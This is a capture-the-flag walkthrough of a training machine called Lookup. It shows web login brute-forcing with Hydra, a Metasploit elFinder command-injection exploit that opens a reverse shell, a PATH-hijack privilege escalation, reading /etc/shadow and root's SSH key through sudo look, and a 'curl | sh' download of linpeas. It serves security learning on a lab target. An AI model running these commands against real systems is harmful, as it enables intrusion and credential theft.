- [[#Test your enumeration skills on this boot-to-root machine.|Test your enumeration skills on this boot-to-root machine.]]
- [[#Initial Reconnaissance|Initial Reconnaissance]]
- [[#What is the user flag?|What is the user flag?]]
- [[#What is the root flag?|What is the root flag?]]
- [[#Summary|Summary]]
- [[#Full logging / output|Full logging / output]]
	- [[#Full logging / output#Creating the files txt files into a single file, just encase we needed to use it|Creating the files txt files into a single file, just encase we needed to use it]]
	- [[#Full logging / output#full linpeas|full linpeas]]
	- [[#Full logging / output#Full STRACE|Full STRACE]]


##  Test your enumeration skills on this boot-to-root machine.

**Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

##  Initial Reconnaissance

* Finding open services with nmap, tried a few different scan types but didn't finder more services 
```
nmap -p- -sV 10.10.215.104      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 03:34 EDT
Nmap scan report for 10.10.215.104
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 379.84 seconds

```


* http://10.10.215.104 redirects to http://lookup.thm but no page loads, adding to host file and we get a login page

```
sudo nano /etc/hosts 
10.10.215.104 lookup.thm
```

* Not much to the login page, no HTML comments, post to login.php
* Not finding injection on the login page
* Testing SSH we can't do username enumeration
* No robots.txt
* Go buster doesn't find much, did search for php, txt, but didn't get any extra hits

```
gobuster dir -u http://lookup.thm/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 719]
/server-status        (Status: 403) [Size: 275]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

```
dig lookup.thm ANY


; <<>> DiG 9.20.2-1-Debian <<>> lookup.thm ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 17105
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
; EDE: 29: (Result synthesized by root-nx-trust)
;; QUESTION SECTION:
;lookup.thm.                    IN      ANY

;; AUTHORITY SECTION:
.                       2950    IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2025031900 1800 900 604800 86400

;; Query time: 4 msec
;; SERVER: 192.168.182.2#53(192.168.182.2) (TCP)
;; WHEN: Wed Mar 19 03:44:36 EDT 2025
;; MSG SIZE  rcvd: 155
```


## What is the user flag?

Attempting to webpage login with random data gives us error
**Wrong username or password. Please try again.**

Can we enumerate username? testing common usernames manaully found admin gives us 
**Wrong password. Please try again.**

This suggests we can enumerate usernames due to difference in error messages. Attempting to brute force admin with 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=admin&password=^PASS^:Wrong password"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 21:24:26
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.resto
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=admin&password=^PASS^:Wrong password
[STATUS] 720.00 tries/min, 720 tries in 00:01h, 14343679 to do in 332:02h, 16 active
[80][http-post-form] host: lookup.thm   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 21:26:33


```

gives us a password found, although when we try to login we get error **Wrong username or password. Please try again.**

This maybe suggest there is another user that has the password **password123** and there is some logic issues for username/password checking. 

Back to username emulation, we pull down a names list with,
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt
```

Then 
```
hydra -L names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=password123:Wrong" 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 21:30:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=password123:Wrong
[STATUS] 736.00 tries/min, 736 tries in 00:01h, 9441 to do in 00:13h, 16 active
[STATUS] 732.33 tries/min, 2197 tries in 00:03h, 7980 to do in 00:11h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123                                                                                                                               
[STATUS] 731.29 tries/min, 5119 tries in 00:07h, 5058 to do in 00:07h, 16 active     
```

We find username jose and we can login with jose. once logged in we get directed to files.lookup.thm which we need to add to our host file.

```
sudo nano /etc/hosts 
10.10.215.104 lookup.thm files.lookup.thm
```

Now we get a page lFinder web application with random txt files, does have an about page,  

```
elFinder
Web file manager
Version: 2.1.47
protocol version: 2.1047
jQuery/jQuery UI: 3.3.1/1.12.1
```

Checking exploit-db we find this version could be vulnerable,  
```
[2019-9194](https://nvd.nist.gov/vuln/detail/CVE-2019-9194)

https://www.exploit-db.com/exploits/46481
```

Exploit-db does have a python script, although to make life easy checking Metasploit 

```
mfsconsole
msf6 > search CVE-2019-9194

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

```

Can we can get a low privliaged shell 
```
use 0
set RHOSTS files.lookup.thm
set LHOST 10.4.114.252 
show options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     files.lookup.thm  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/  yes       The base path to elFinder
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.4.114.252     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:
show
   Id  Name
   --  ----
   0   Auto

Exploit

[*] Started reverse TCP handler on 10.4.114.252:4444 
[*] Uploading payload 'asw6hc76Gf.jpg;echo 6370202e2e2f66696c65732f617377366863373647662e6a70672a6563686f2a202e46794a714b584368514d2e706870 |xxd -r -p |sh& #.jpg' (1944 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.FyJqKXChQM.php) ...
[*] Sending stage (40004 bytes) to 10.10.224.116
[+] Deleted .FyJqKXChQM.php
[*] Meterpreter session 1 opened (10.4.114.252:4444 -> 10.10.224.116:37368) at 2025-03-19 21:39:47 -0400
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

```

We don't have access to user.txt :(
```
meterpreter > shell
Process 1445 created.
Channel 0 created.

whoami
www-data

pwd
/var/www/files.lookup.thm/public_html/elFinder/php

cd /home
ls
think
cd think
ls
user.txt
cat user.txt
cat: user.txt: Permission denied

```

We can cat passwd but not shadow
```
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false

```

```
cat /etc/shadow
cat: /etc/shadow: Permission denied
```

No access to sudo  

```
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper

```

Checking for SUID or SGID bits set, likely what we need, 

```
find / -type f -perm -04000 -ls 2>/dev/null
      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign

```

linpeas.sh suggests suggests /usr/sbin/pwm is not a common / known file so might be it. not having much luck with gtfobins and other files. 
https://gtfobins.github.io/gtfobins

```
╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1950/usr/bin/chage                                                                                      
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1950/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Apr  3  2023 /snap/core20/1950/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K May 30  2023 /snap/core20/1950/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1950/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1950/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1974/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1974/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Apr  3  2023 /snap/core20/1974/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K May 30  2023 /snap/core20/1974/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1974/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Jan 11  2024 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43K Jan 11  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 11  2024 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SGID binary)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 343K Aug  4  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root tty 35K May 30  2023 /usr/bin/wall
```

running pwm gives us 
```
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

```

I think pwm = Password Manager? Lets try pull down to reverse engineer locally using a python web server
```
cp /usr/sbin/pwm /tmp
cd /tmp
ls
pwm
python3 -m http.server 8000

```

On kali
```
wget http://lookup.thm:8000/pwm  
```

We can run locally on kali
```
└─$ /home/kali/pwm                                                            
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: kali
[-] File /home/kali/.passwords not found

```

Confirmed if we make a .password file within user profile it reads out  
```
 Running 'id' command to extract the username and user ID (UID)
[!] ID: kali
[-] File /home/kali/.passwords not found

$ nano /home/kali/.passwords           

/home/kali/pwm            
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: kali
lost
hello

```

ChatGPT of a strace of pwm, full strace provided after the summary 

```
### 1. **Starts normally**
execve("/home/kali/pwm", ...)

### 2. **Prints a message to stdout**
write(1, "[!] Running 'id' command to extract the username and user ID (UID)", ...)

#### 3. **Spawns a Shell to Run `id`**
execve("/bin/sh", ["sh", "-c", "--", "id"], ...)

It uses a shell to execute the id command. This prints your UID, GID, groups, etc.
[!] ID: kali

### 4. **Attempts to read `.passwords`**
openat(AT_FDCWD, "/home/kali/.passwords", O_RDONLY) read(3, "lost\nhello\n", 4096)


```

So if we can make id return think, it should return thinks .passwords,

Confirmed we can add to Path, 
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH=/tmp:$PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

```

This means we can create our own id within tmp that tricks pwm to report we are user think, then as PWM has sudo will be able to open thinks .password file and read back to us.

To do this, we can use the real id to confirm what our fake id needs to return, 

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
id think
uid=1000(think) gid=1000(think) groups=1000(think)
```

Creating id and confirming it works,
```
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
chmod +x /tmp/id
id
uid=1000(think) gid=1000(think) groups=1000(think)
```

Running now gives us the password list, can we make this into a list and hydra ssh for think?
```
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
********************
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171

```

Yes, yes we can,
```
hydra -l think -P think.txt lookup.thm ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 22:52:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: ********************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 22:52:30

```

Connecting and getting flag, 
```
ssh think@lookup.thm    
think@lookup.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 Mar 2025 02:53:57 AM UTC

  System load:  0.0               Processes:             137
  Usage of /:   59.7% of 9.75GB   Users logged in:       0
  Memory usage: 23%               IPv4 address for ens5: 10.10.125.31
  Swap usage:   0%

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 12 12:07:25 2024 from 192.168.14.1
think@lookup:~$ cat /home/think/user.txt
38375**********************b820e

```

## What is the root flag?

That first flag was hard, lets hope this flag is not as bad, 

does think have any sudo commands? yes, /usr/bin/look

```
think@lookup:~$ sudo -l
[sudo] password for think: 

Sorry, try again.
[sudo] password for think: 
Sorry, try again.
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look

```

gtfobins helps out here,
```
https://gtfobins.github.io/gtfobins/look/
LFILE=file_to_read
look '' "$LFILE"
```

We can guess the root flag location, 
```
think@lookup:~$ sudo /usr/bin/look '' /root/root.txt
5a285a9****************18e8
```

Although is there another way? 

No go with hashcat against rockyou
```
think@lookup:~$ sudo /usr/bin/look '' /etc/shadow
unshadow passwd shadow > hashes.txt  

 .\hashcat.exe -w 3 -m 1800 hashes.txt rockyou.txt

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$2Let6rRsGjyY5Nym$Z9P/fbmQG/EnCtlx9U5l78.bQYu8ZRw...bu6sU1
Time.Started.....: Thu Mar 20 17:51:00 2025 (2 mins, 55 secs)
Time.Estimated...: Thu Mar 20 17:53:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    81917 H/s (66.15ms) @ Accel:128 Loops:1024 Thr:256 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[216e6f736531393837] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 66c Fan: 78% Util: 81% Core:1965MHz Mem:6801MHz Bus:16

Started: Thu Mar 20 17:50:57 2025
Stopped: Thu Mar 20 17:53:56 2025


```

Nice we can get roots ssh key, 
```
think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR
.....................
dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----

```

And we can connect 
```
nano id_rsa        
chmod 600 id_rsa

ssh -i id_rsa root@lookup.thm
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 20 Mar 2025 06:42:57 AM UTC

  System load:  0.27              Processes:             138
  Usage of /:   59.7% of 9.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for ens5: 10.10.181.92
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 13 10:00:24 2024 from 192.168.14.1
root@lookup:~# 

```

## Summary

Wow, that one had a bit of everything — definitely harder than most of the easy challenges, but a lot of fun and a great way to bring all those techniques together.

## Full logging / output
### Creating the elFinder txt files into a single file, just encase we needed to use it
```
cd /var/www/files.lookup.thm/public_html/elFinder/files

for file in *.txt; do echo "=== $file ==="; cat "$file"; echo ""; done
=== DnuBjuShGH.txt ===
iPyUHnofNFNL

=== adm.txt ===
swaddle
throbbed

=== admin.txt ===
pectic
agretha
only-begotten
renewable

=== administrator.txt ===
rycca
show-offs
overcast
packinghouse

=== ansible.txt ===
erroll
madagascan
angina
eulogistic

=== azureuser.txt ===
thirty-three
underpart
responder
handgun

=== credentials.txt ===
think : nopassword

=== ec2-user.txt ===
resourcelessness
jazz

=== ftp.txt ===
harebrained
refereed
doctorskop

=== guest.txt ===
shipman
budgie
holm
firetruck

=== info.txt ===
hygienic
cubby-hole
williston
arkaroola

=== lvdLAM.txt ===
RZkbcUDtMQFcASnJ

=== mysql.txt ===
acculturation
rotterdam
idiosyncratically

=== oracle.txt ===
gluten
enjoyableness

=== pi.txt ===
ultracentrifugally
whistler
pervertedly
unlettered

=== puppet.txt ===
hypothalamus
filigreeing

=== root.txt ===
symmetrical
volumetrically

=== sTOpIPw.txt ===
rePwvCyvjKor
=== test.txt ===
tipoff
dhabi
deriding
hoofer

=== thislogin.txt ===
jose : password123

=== user.txt ===
earthy
fiduciary
weighted
outbound

=== vagrant.txt ===
altair
smokestack
superconductor

```


### full linpeas
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:02:10 --:--:--     0
curl: (28) Failed to connect to github.com port 443: Connection timed out
curl 10.4.114.252/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
curl: (7) Failed to connect to 10.4.114.252 port 80: Connection refused
curl 10.4.114.252:8888/linpeas.sh | sh   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  2  820k    2 17864    0     0  21574      0  0:00:38 --:--:--  0:00:38 21548

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
